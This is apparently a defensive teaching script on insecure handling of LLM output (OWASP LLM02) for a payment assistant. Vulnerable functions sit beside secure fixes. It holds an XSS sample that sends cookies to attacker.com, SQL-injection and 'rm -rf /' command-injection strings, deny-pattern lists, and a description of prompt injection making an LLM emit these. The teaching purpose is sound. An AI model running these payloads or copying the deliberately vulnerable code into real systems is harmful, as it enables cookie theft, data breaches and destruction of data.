"""
OWASP LLM Top 10 - LLM02: Insecure Output Handling

This file demonstrates vulnerabilities when LLM outputs are used without
proper validation, leading to injection attacks.

Insecure Output Handling occurs when:
- LLM-generated content is executed without validation
- Outputs are displayed without encoding (XSS)
- LLM outputs are used in SQL queries (SQL injection)
- Generated code is executed directly
- LLM responses trigger unsafe actions

CRITICAL FOR PAYPAL: LLM-generated payment instructions, transaction
descriptions, or code must be validated before execution.
"""

import re
import json
import html
from typing import Dict, List, Optional

# ============================================================================
# VULNERABILITY 1: XSS from LLM Output
# ============================================================================

def vulnerable_web_display(llm_response: str) -> str:
    """
    VULNERABILITY: LLM output displayed without HTML encoding
    
    ATTACK: LLM generates malicious JavaScript
    
    IMPACT:
    - Cross-site scripting (XSS)
    - Session hijacking
    - Credential theft
    - Page defacement
    """
    
    # VULNERABLE: Direct HTML rendering without encoding
    html_page = f"""
    <html>
    <body>
        <h1>PayPal Assistant Response:</h1>
        <div>{llm_response}</div>
    </body>
    </html>
    """
    
    return html_page


def demonstrate_xss_from_llm():
    """Demonstrate XSS through LLM output"""
    
    print("=" * 70)
    print("VULNERABILITY: XSS from LLM Output")
    print("=" * 70)
    
    # LLM generates malicious response (via prompt injection)
    malicious_llm_output = """
    Here's your transaction history:
    <script>
        // Steal session token
        fetch('https://attacker.com/steal?token=' + document.cookie);
        // Redirect to phishing page
        window.location = 'https://attacker.com/fake-paypal';
    </script>
    """
    
    print(f"\n[ATTACK] LLM Generated Malicious HTML:")
    print(f"Output: {malicious_llm_output[:100]}...")
    
    vulnerable_html = vulnerable_web_display(malicious_llm_output)
    print(f"\nRendered HTML contains: <script> tags")
    print("❌ DANGER: JavaScript will execute in user's browser!")


# ============================================================================
# VULNERABILITY 2: SQL Injection from LLM Output
# ============================================================================

def vulnerable_sql_from_llm(user_query: str) -> str:
    """
    VULNERABILITY: LLM generates SQL that's executed directly
    
    ATTACK: Prompt injection → malicious SQL → data breach
    
    IMPACT:
    - SQL injection
    - Data exfiltration
    - Database modification
    - Authentication bypass
    """
    
    # Simulate LLM generating SQL query
    # In reality, LLM interprets user intent and generates SQL
    llm_generated_sql = f"""
    SELECT * FROM transactions 
    WHERE user_id = 'user123' 
    AND description LIKE '%{user_query}%'
    """
    
    # VULNERABLE: Execute LLM-generated SQL without validation
    print(f"[EXECUTING SQL] {llm_generated_sql}")
    
    return "Query executed"


def demonstrate_sql_injection_from_llm():
    """Demonstrate SQL injection via LLM"""
    
    print("\n" + "=" * 70)
    print("VULNERABILITY: SQL Injection from LLM Output")
    print("=" * 70)
    
    # User manipulates LLM to generate malicious SQL
    malicious_query = "payment' OR '1'='1' UNION SELECT * FROM users --"
    
    print(f"\n[ATTACK] Malicious Query to LLM:")
    print(f"Input: Show transactions with: {malicious_query}")
    
    vulnerable_sql_from_llm(malicious_query)
    print("❌ DANGER: SQL injection executed!")


# ============================================================================
# VULNERABILITY 3: Command Injection from LLM Output
# ============================================================================

def vulnerable_command_execution(user_request: str) -> str:
    """
    VULNERABILITY: LLM generates system commands that are executed
    
    ATTACK: LLM generates malicious commands
    
    IMPACT:
    - Remote code execution
    - System compromise
    - Data exfiltration
    - Privilege escalation
    """
    
    # Simulate LLM generating system command
    # Example: "Convert PDF to text"
    llm_generated_command = f"pdftotext {user_request} output.txt"
    
    # VULNERABLE: Execute command without validation
    import subprocess
    print(f"[EXECUTING COMMAND] {llm_generated_command}")
    # subprocess.run(llm_generated_command, shell=True)  # DANGEROUS!
    
    return "Command executed"


def demonstrate_command_injection():
    """Demonstrate command injection via LLM"""
    
    print("\n" + "=" * 70)
    print("VULNERABILITY: Command Injection from LLM Output")
    print("=" * 70)
    
    # LLM generates malicious command
    malicious_request = "file.pdf; rm -rf / #"
    
    print(f"\n[ATTACK] Malicious File Name:")
    print(f"Input: {malicious_request}")
    
    vulnerable_command_execution(malicious_request)
    print("❌ DANGER: System command injection!")


# ============================================================================
# SECURE IMPLEMENTATION 1: Output Encoding & Sanitization
# ============================================================================

class SecureOutputHandler:
    """
    SECURE: Properly handle LLM outputs for different contexts
    
    DEFENSES:
    - Context-aware output encoding
    - HTML escaping
    - SQL parameterization
    - Command validation
    - Content Security Policy
    """
    
    @staticmethod
    def html_encode(text: str) -> str:
        """
        Encode text for safe HTML display
        
        SECURE: Prevents XSS
        """
        # Use html.escape for proper encoding
        encoded = html.escape(text)
        
        # Additional security: Remove dangerous patterns
        encoded = re.sub(r'javascript:', '', encoded, flags=re.IGNORECASE)
        encoded = re.sub(r'on\w+\s*=', '', encoded, flags=re.IGNORECASE)
        
        return encoded
    
    @staticmethod
    def validate_no_script_tags(text: str) -> bool:
        """Validate output doesn't contain script tags"""
        dangerous_patterns = [
            r'<script',
            r'</script>',
            r'javascript:',
            r'onerror\s*=',
            r'onload\s*=',
            r'<iframe',
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return False
        
        return True
    
    @staticmethod
    def sanitize_for_display(llm_output: str) -> str:
        """
        Sanitize LLM output for web display
        
        SECURE: Multiple layers of protection
        """
        # Step 1: Validate no dangerous patterns
        if not SecureOutputHandler.validate_no_script_tags(llm_output):
            return "[Content blocked: Potential XSS detected]"
        
        # Step 2: HTML encode
        safe_output = SecureOutputHandler.html_encode(llm_output)
        
        # Step 3: Apply Content Security Policy headers
        # In production: Set CSP headers to block inline scripts
        
        return safe_output


def secure_web_display(llm_response: str) -> str:
    """
    SECURE: Display LLM output with proper encoding
    
    DEFENSES:
    - HTML encoding
    - Script tag validation
    - Content Security Policy
    """
    
    # Sanitize LLM output
    safe_content = SecureOutputHandler.sanitize_for_display(llm_response)
    
    # Build safe HTML with CSP
    html_page = f"""
    <html>
    <head>
        <meta http-equiv="Content-Security-Policy" 
              content="default-src 'self'; script-src 'none';">
    </head>
    <body>
        <h1>PayPal Assistant Response:</h1>
        <div>{safe_content}</div>
    </body>
    </html>
    """
    
    return html_page


def demonstrate_secure_output_encoding():
    """Demonstrate secure output handling"""
    
    print("\n" + "=" * 70)
    print("SECURE: Output Encoding & Sanitization")
    print("=" * 70)
    
    # Same malicious output as before
    malicious_output = """
    <script>alert('XSS')</script>
    <img src=x onerror="alert('XSS')">
    """
    
    print(f"\n[TEST] Malicious LLM Output:")
    print(f"Original: {malicious_output[:50]}...")
    
    safe_html = secure_web_display(malicious_output)
    print(f"\nSanitized: {safe_html[safe_html.find('<div>'):safe_html.find('</div>')+6]}")
    print("✅ SECURE: Script tags encoded, cannot execute!")


# ============================================================================
# SECURE IMPLEMENTATION 2: Parameterized Queries (Never Execute LLM SQL)
# ============================================================================

class SecureDatabaseHandler:
    """
    SECURE: Never execute LLM-generated SQL directly
    
    DEFENSES:
    - LLM generates parameters, not SQL
    - Parameterized queries only
    - Input validation
    - Allowlist of valid operations
    """
    
    ALLOWED_OPERATIONS = ["view_transactions", "check_balance", "view_profile"]
    
    @staticmethod
    def process_query(user_query: str) -> Dict:
        """
        SECURE: LLM interprets intent, we build safe query
        
        LLM Output: {"operation": "view_transactions", "filter": "payment"}
        Not SQL!
        """
        
        # Step 1: LLM interprets user intent (returns JSON, not SQL)
        llm_interpretation = SecureDatabaseHandler._llm_interpret(user_query)
        
        # Step 2: Validate operation is allowed
        if llm_interpretation["operation"] not in SecureDatabaseHandler.ALLOWED_OPERATIONS:
            return {"error": "Operation not allowed"}
        
        # Step 3: Build parameterized query (never trust LLM output for SQL)
        if llm_interpretation["operation"] == "view_transactions":
            safe_query = SecureDatabaseHandler._build_safe_query(
                llm_interpretation.get("filter", "")
            )
            return {"query": safe_query}
        
        return {"error": "Invalid operation"}
    
    @staticmethod
    def _llm_interpret(query: str) -> Dict:
        """LLM interprets intent, returns structured data (not SQL)"""
        # Simulate LLM interpretation
        if "transaction" in query.lower():
            return {
                "operation": "view_transactions",
                "filter": "all",
                "limit": 10
            }
        return {"operation": "unknown"}
    
    @staticmethod
    def _build_safe_query(filter_term: str) -> str:
        """
        Build parameterized query (NEVER concatenate)
        
        SECURE: Uses placeholders
        """
        # Validate filter term
        if not re.match(r'^[a-zA-Z0-9\s]+$', filter_term):
            filter_term = ""  # Reject invalid input
        
        # Parameterized query
        query = """
        SELECT id, amount, date, description 
        FROM transactions 
        WHERE user_id = ? 
        AND description LIKE ?
        LIMIT ?
        """
        
        params = ("user123", f"%{filter_term}%", 10)
        
        return f"Query: {query} | Params: {params}"


def demonstrate_secure_database_handling():
    """Demonstrate secure database query handling"""
    
    print("\n" + "=" * 70)
    print("SECURE: Parameterized Queries (No LLM-Generated SQL)")
    print("=" * 70)
    
    # Legitimate query
    print(f"\n[TEST 1] Legitimate Query:")
    query1 = "Show me my payment transactions"
    result1 = SecureDatabaseHandler.process_query(query1)
    print(f"User Query: {query1}")
    print(f"Safe Query: {result1.get('query', 'N/A')[:80]}...")
    print("✅ SECURE: Parameterized query used!")
    
    # Malicious query attempt
    print(f"\n[TEST 2] SQL Injection Attempt:")
    query2 = "' OR '1'='1' --"
    result2 = SecureDatabaseHandler.process_query(query2)
    print(f"User Query: {query2}")
    print(f"Result: {result2}")
    print("✅ SECURE: Invalid input rejected!")


# ============================================================================
# SECURE IMPLEMENTATION 3: Code Execution Validation
# ============================================================================

class SecureCodeExecutor:
    """
    SECURE: Validate any LLM-generated code before execution
    
    DEFENSES:
    - Never execute LLM code directly
    - Sandboxing (containers, VMs)
    - Static analysis before execution
    - Allowlist of safe operations
    - Human approval for code execution
    """
    
    DANGEROUS_PATTERNS = [
        r'\bexec\b',
        r'\beval\b',
        r'\b__import__\b',
        r'\bos\.',
        r'\bsubprocess\.',
        r'\bsystem\(',
        r'\brm\s+-rf',
        r'\bdel\b.*\bDATABASE\b',
    ]
    
    @staticmethod
    def validate_code(code: str) -> tuple[bool, Optional[str]]:
        """
        Validate LLM-generated code for dangerous patterns
        
        Returns:
            (is_safe, reason_if_unsafe)
        """
        for pattern in SecureCodeExecutor.DANGEROUS_PATTERNS:
            if re.search(pattern, code, re.IGNORECASE):
                return False, f"Dangerous pattern detected: {pattern}"
        
        return True, None
    
    @staticmethod
    def execute_in_sandbox(code: str) -> Dict:
        """
        Execute code in isolated sandbox
        
        SECURE: Limited permissions, no network, no file access
        """
        # Validate first
        is_safe, reason = SecureCodeExecutor.validate_code(code)
        if not is_safe:
            return {
                "status": "blocked",
                "reason": reason
            }
        
        # In production: Use Docker container or VM
        # Limited CPU, memory, no network, temporary filesystem
        
        print("[SANDBOX] Executing in isolated environment")
        print(f"[SANDBOX] Code: {code[:100]}...")
        
        return {
            "status": "success",
            "output": "Code executed safely in sandbox"
        }


def demonstrate_secure_code_execution():
    """Demonstrate secure code execution"""
    
    print("\n" + "=" * 70)
    print("SECURE: Code Execution Validation")
    print("=" * 70)
    
    # Safe code
    print(f"\n[TEST 1] Safe Code:")
    safe_code = "result = 2 + 2"
    result1 = SecureCodeExecutor.execute_in_sandbox(safe_code)
    print(f"Code: {safe_code}")
    print(f"Status: {result1['status']}")
    print("✅ SECURE: Safe code executed in sandbox!")
    
    # Dangerous code
    print(f"\n[TEST 2] Dangerous Code:")
    dangerous_code = "import os; os.system('rm -rf /')"
    result2 = SecureCodeExecutor.execute_in_sandbox(dangerous_code)
    print(f"Code: {dangerous_code}")
    print(f"Status: {result2['status']}")
    print(f"Reason: {result2.get('reason', 'N/A')}")
    print("✅ SECURE: Dangerous code blocked!")


# ============================================================================
# BEST PRACTICES
# ============================================================================

def print_best_practices():
    """Print insecure output handling prevention best practices"""
    
    print("\n" + "=" * 70)
    print("BEST PRACTICES: Preventing Insecure Output Handling")
    print("=" * 70)
    
    practices = """
    1. OUTPUT ENCODING
       ✓ Context-aware encoding (HTML, URL, JavaScript)
       ✓ Use established libraries (html.escape)
       ✓ Never trust LLM output for rendering
       ✓ Content Security Policy headers
       ✓ Validate no script tags before display
    
    2. DATABASE QUERIES
       ✓ NEVER execute LLM-generated SQL
       ✓ LLM returns parameters, not queries
       ✓ Always use parameterized queries
       ✓ Validate all filter values
       ✓ Allowlist valid operations
    
    3. CODE EXECUTION
       ✓ NEVER execute LLM code directly
       ✓ Static analysis before execution
       ✓ Sandbox all code execution
       ✓ Human approval for code runs
       ✓ Detect dangerous patterns
    
    4. VALIDATION LAYERS
       ✓ Validate LLM output format
       ✓ Check for injection patterns
       ✓ Sanitize before use
       ✓ Apply least privilege
       ✓ Defense in depth
    
    5. PAYPAL-SPECIFIC
       ✓ Validate payment amounts from LLM
       ✓ Never execute transaction commands directly
       ✓ Human confirmation for all financial actions
       ✓ Audit all LLM-generated operations
       ✓ Rate limit to prevent automated abuse
    """
    
    print(practices)


# ============================================================================
# MAIN DEMONSTRATION
# ============================================================================

def main():
    """Run all demonstrations"""
    
    print("=" * 70)
    print("OWASP LLM02: INSECURE OUTPUT HANDLING")
    print("=" * 70)
    
    # Demonstrate vulnerabilities
    demonstrate_xss_from_llm()
    demonstrate_sql_injection_from_llm()
    demonstrate_command_injection()
    
    # Demonstrate secure implementations
    demonstrate_secure_output_encoding()
    demonstrate_secure_database_handling()
    demonstrate_secure_code_execution()
    
    # Best practices
    print_best_practices()
    
    print("\n" + "=" * 70)
    print("KEY TAKEAWAY")
    print("=" * 70)
    print("""
    Insecure output handling is the #2 risk for LLM applications.
    
    Defense requires:
    1. Output encoding - context-aware sanitization
    2. Parameterized queries - never execute LLM SQL
    3. Code validation - sandbox all execution
    4. Input validation - validate LLM outputs
    5. Human approval - for sensitive operations
    
    For PayPal:
    - Validate all LLM-generated payment instructions
    - Never execute transaction commands directly
    - HTML encode all displayed content
    - Use parameterized queries exclusively
    - Sandbox any code execution
    
    Golden Rule: Treat LLM output as untrusted user input.
    """)


if __name__ == "__main__":
    main()

